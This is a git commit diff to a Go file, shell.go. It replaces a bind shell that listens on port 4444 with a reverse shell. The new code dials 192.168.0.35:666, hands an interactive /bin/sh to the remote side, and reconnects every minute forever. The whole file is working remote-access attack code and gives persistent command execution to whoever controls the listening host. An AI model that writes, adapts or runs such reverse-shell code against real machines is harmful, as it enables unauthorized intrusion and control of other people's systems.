86e12b1053300db3848be8fdf3183311eb4afbc7
Lessyz <102208615+Lessyzz@users.noreply.github.com>
2025-04-30 17:49:18 +0300

    Update shell.go

--- shell.go
+++ shell.go
@@ -1,52 +1,28 @@
 package main
 
 import (
-	"flag"
-	"fmt"
-	"io"
-	"log"
 	"net"
 	"os/exec"
+	"time"
 )
 
-func handle(conn net.Conn) {
-	defer conn.Close()
-	cmd := exec.Command("/bin/sh", "-i")
-
-	// io.Pipe() creates synchronised reader and writer
-	// everything written to writer gets read by the reader
-	readerPipe, writerPipe := io.Pipe()
-
-	// shell will receive commands from connection
-	cmd.Stdin = conn
-	// shell will send output to writer pipe
-	cmd.Stdout = writerPipe
-
-	// since stdout is automatically read by readerPipe we can copy it to
-	// our connection and send it back (using goroutine for non-blocking)
-	go io.Copy(conn, readerPipe)
-	cmd.Run()
+func main() {
+	reverse("192.168.0.35:666")
 }
 
-func main() {
-	var addr string
-	flag.StringVar(&addr, "addr", "0.0.0.0:4444", "specify address and port to listen on")
-	flag.Parse()
-
-	listener, err := net.Listen("tcp", addr)
-	if err != nil {
-		log.Fatalln("Error while binding port.")
-	}
-
-	log.Println("Listening on " + addr)
-
-	for {
-		conn, err := listener.Accept()
-		fmt.Println("Received connection")
-		if err != nil {
-			log.Fatalln("Error when accepting connection.")
+func reverse(host string) {
+	c, err := net.Dial("tcp", host)
+	if nil != err {
+		if nil != c {
+			c.Close()
 		}
-
-		go handle(conn)
+		time.Sleep(time.Minute)
+		reverse(host)
 	}
+
+	cmd := exec.Command("/bin/sh")
+	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
+	cmd.Run()
+	c.Close()
+	reverse(host)
 }
